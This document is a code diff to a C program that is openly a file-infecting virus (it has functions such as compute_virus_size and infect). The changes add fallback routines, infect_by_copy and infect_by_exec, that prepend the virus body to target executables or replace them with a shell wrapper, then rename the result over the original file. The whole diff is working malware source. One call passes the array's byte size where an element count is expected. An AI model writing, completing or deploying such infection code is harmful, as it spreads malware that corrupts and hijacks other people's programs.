@@ -17,6 +17,7 @@
 #include <sys/sendfile.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <sys/uio.h>
 #include <unistd.h>
 
 #ifndef __ELF__
@@ -50,6 +51,34 @@ off_t compute_virus_size(FILE *file) {
     }
 }
 
+size_t write_all(int fd, const void *buf, size_t remaining) {
+    while (remaining > 0) {
+        ssize_t result = write(fd, buf, remaining);
+        if (result < 0) break;
+        remaining -= result;
+    }
+    return remaining;
+}
+
+int writev_all(int fd, struct iovec *iov, int remaining) {
+    while (remaining > 0) {
+        ssize_t result = writev(fd, iov, remaining);
+        if (result < 0) break;
+        for (int i = 0; i < remaining; ++i) {
+            size_t *iov_len = &iov->iov_len;
+            if ((size_t) result >= *iov_len) {
+                result -= *iov_len;
+                ++iov;
+                --remaining;
+            } else {
+                *iov_len -= result;
+                break;
+            }
+        }
+    }
+    return remaining;
+}
+
 size_t sendfile_all(int out_fd, int in_fd, size_t remaining) {
     while (remaining > 0) {
         ssize_t result = sendfile(out_fd, in_fd, NULL, remaining);
@@ -59,13 +88,147 @@ size_t sendfile_all(int out_fd, int in_fd, size_t remaining) {
     return remaining;
 }
 
+int infect_by_exec(const char *virus, size_t virus_size, const char *path) {
+    int result = 0;
+
+    char link[PATH_MAX];
+    ssize_t length = readlink(path, link, sizeof(link) - 1);
+    if (length < 0) {
+        result = errno;
+        goto exit;
+    }
+    link[length] = '\n';
+
+    char tmp_name[] = "XXXXXX";
+    int tmp_fd = mkstemp(tmp_name);
+    if (tmp_fd == -1) {
+        result = errno;
+        goto exit;
+    }
+
+    result = fchmod(tmp_fd, S_IRUSR | S_IXUSR);
+    if (result == -1) {
+        result = errno;
+        goto close_tmp;
+    }
+
+    static const char script_header[] = "#!/bin/sh\nexec ";
+
+    result = posix_fallocate(tmp_fd, 0, virus_size + sizeof(script_header) + length);
+    if (result) {
+        goto close_tmp;
+    }
+    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
+
+    struct iovec iov[] = {
+        {(void *) virus, virus_size},
+        {(void *) script_header, sizeof(script_header) - 1},
+        {link, length + 1}
+    };
+    int remaining = writev_all(tmp_fd, iov, sizeof(iov));
+    if (remaining > 0) {
+        result = errno;
+        goto close_tmp;
+    }
+
+    result = fsync(tmp_fd);
+    if (result) {
+        result = errno;
+        goto close_tmp;
+    }
+
+    close(tmp_fd);
+    result = rename(tmp_name, path);
+    if (result) {
+        result = errno;
+        unlink(tmp_name);
+    }
+    goto exit;
+
+close_tmp:
+    close(tmp_fd);
+    unlink(tmp_name);
+
+exit:
+    return result;
+}
+
+int infect_by_copy(const char *virus, size_t virus_size, const char *path) {
+    int result = 0;
+
+    int fd = open(path, O_RDONLY);
+    if (fd == -1) {
+        return infect_by_exec(virus, virus_size, path);
+    }
+
+    struct stat stat;
+    if (fstat(fd, &stat)) {
+        result = errno;
+        goto close_fd;
+    }
+
+    char tmp_name[] = "XXXXXX";
+    int tmp_fd = mkstemp(tmp_name);
+    if (tmp_fd == -1) {
+        result = errno;
+        goto close_fd;
+    }
+
+    result = fchmod(tmp_fd, ~S_IFMT & stat.st_mode);
+    if (result == -1) {
+        result = errno;
+        goto close_fd;
+    }
+
+    result = posix_fallocate(tmp_fd, 0, stat.st_size + virus_size);
+    if (result) {
+        goto close_tmp;
+    }
+    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
+
+    size_t remaining = write_all(tmp_fd, virus, virus_size);
+    if (remaining > 0) {
+        result = errno;
+        goto close_tmp;
+    }
+
+    posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
+    remaining = sendfile_all(tmp_fd, fd, stat.st_size);
+    if (remaining > 0) {
+        result = errno;
+        goto close_tmp;
+    }
+
+    result = fsync(tmp_fd);
+    if (result) {
+        result = errno;
+        goto close_tmp;
+    }
+
+    close(tmp_fd);
+    result = rename(tmp_name, path);
+    if (result) {
+        result = errno;
+        unlink(tmp_name);
+    }
+    goto close_fd;
+
+close_tmp:
+    close(tmp_fd);
+    unlink(tmp_name);
+
+close_fd:
+    close(fd);
+
+    return result;
+}
+
 int infect(const char *virus, size_t virus_size, const char *path) {
     int result = 0;
 
     int fd = open(path, O_RDWR);
     if (fd == -1) {
-        result = errno;
-        goto exit;
+        return infect_by_copy(virus, virus_size, path);
     }
 
     struct stat stat;
@@ -99,7 +262,6 @@ int infect(const char *virus, size_t virus_size, const char *path) {
 close_fd:
     close(fd);
 
-exit:
     return result;
 }
 
